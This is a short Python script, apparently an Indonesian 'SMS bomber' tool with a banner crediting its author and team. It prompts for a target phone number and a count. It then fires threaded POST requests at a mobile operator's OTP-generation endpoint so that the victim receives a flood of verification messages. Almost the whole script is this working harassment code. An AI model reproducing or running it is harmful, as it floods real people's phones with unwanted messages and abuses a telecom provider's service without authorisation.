#Jan Di Recode yah
#Sayeng :*
#Compiled InYoyurXerXez7
#2e4hTeam
#Kiya

import os
import sys
import time
from time import sleep

g = "\033[32;1m"
gt = "\033[0;32m"
bt = "\033[34;1m"
b = "\033[36;1m"
m = "\033[31;1m"
c = "\033[0m"
p = "\033[37;1m"
u = "\033[35;1m"
M = "\033[3;1m"
k = "\033[33;1m"
kt = "\033[0;33m"
a = "\033[30;1m"

W = "\x1b[0m"
R = "\x1b[31m"
G = "\x1b[1;32m"
O = "\x1b[33m"
B = "\x1b[34m"
P = "\x1b[35m"
C = "\x1b[36m"
GR = "\x1b[37m"
def slowprints(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2.0/90)

from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	(exit)

os.system("clear")
gilang=(a+"""
==============<·~~~~~~~~~~~~>·==============
|\033[1;32m Author : InYourXerXez7\033[30;1m"                |
|\033[1;32mTeam   : Buft~2e4h\033[30;1m"                     |
|\033[1;32mThankTo: My Friends && Allah\033[30;1m"           |
|\033[1;32mCodex  :https://github.com/gillanggans7\033[30;1m"|
|\033[1;32mContack: @XerXezOficial\033[30;1m"                |
==============<·~~~~~~~~~~~~>·==============

""")
os.system('clear')
print(" ")
print(gilang)
input('\n \033[1;31mEnTerUnTukLanjut~$ ')
no = input("\n\033[1;37m NoTarget  ~$ \033[1;32m")
asu = int(input("\033[1;37mImputJumlah~$ \033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;37m[¡] TERKIRIM")
		else:
			print("\033[1;31m[¿] EROR")
	except: pass

jobs = []
for x in range(asu):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
input('\n\033[1;31mTekan Enter UnTuk Kluar~$ ')
os.system('clear')
